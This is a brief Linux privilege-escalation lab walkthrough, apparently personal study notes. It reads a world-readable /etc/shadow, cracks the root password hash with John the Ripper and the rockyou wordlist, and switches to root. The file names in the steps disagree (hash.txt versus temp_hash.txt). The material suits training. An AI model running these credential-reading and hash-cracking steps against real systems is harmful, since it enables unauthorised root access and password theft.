The /etc/shadow file contains user password hashes and is usually readable only by the root user.

**Note that the /etc/shadow file on the VM is world-readable:**
```python
ls -l /etc/shadow
```

**View the contents of the /etc/shadow file:**
```python
cat /etc/shadow
```
- Each line of the file represents a user.
- A user's password hash (if they have one) can be found between the first and second colons (:) of each line.
![[linux_privesc12.png]]

**Save the root user's hash to a file called hash.txt on your Kali VM and use john the ripper to crack it**
```python
john --wordlist=/usr/share/wordlists/rockyou.txt temp_hash.txt
```

**Switch to the root user, using the cracked password:**
```python
su root
```

